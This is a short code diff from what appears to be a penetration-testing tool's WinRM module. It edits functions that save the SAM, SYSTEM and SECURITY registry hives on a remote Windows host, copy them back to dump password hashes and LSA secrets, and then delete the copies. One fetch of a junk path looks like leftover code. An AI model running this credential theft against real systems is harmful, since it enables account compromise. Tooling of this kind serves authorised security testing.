@@ -348,11 +348,11 @@ class winrm(connection):
 
     def sam(self):
         try:
-            self.execute("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM", False)
+            self.execute("cmd /c 'reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM'", False)
             self.conn.fetch("C:\\aaaaaaaaaaaaaa", self.output_filename + ".sam")
             self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
             self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
-            self.execute("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM", False)
+            self.execute("cmd /c 'del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM'", False)
         except Exception as e:
             if e in ["does not exist", "TransformFinalBlock"]:
                 self.logger.fail("Failed to dump SAM hashes, maybe got blocked by AV softwares or current user is not privileged user")
@@ -372,10 +372,10 @@ class winrm(connection):
 
     def lsa(self):
         try:
-            self.execute("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM", False)
+            self.execute("cmd /c 'reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM'", False)
             self.conn.fetch("C:\\windows\\temp\\SECURITY", f"{self.output_filename}.security")
             self.conn.fetch("C:\\windows\\temp\\SYSTEM", f"{self.output_filename}.system")
-            self.execute("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY", False)
+            self.execute("cmd /c 'del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY'", False)
         except Exception as e:
             if e in ["does not exist", "TransformFinalBlock"]:
                 self.logger.fail("Failed to dump LSA secrets, maybe got blocked by AV softwares or current user is not privileged user")
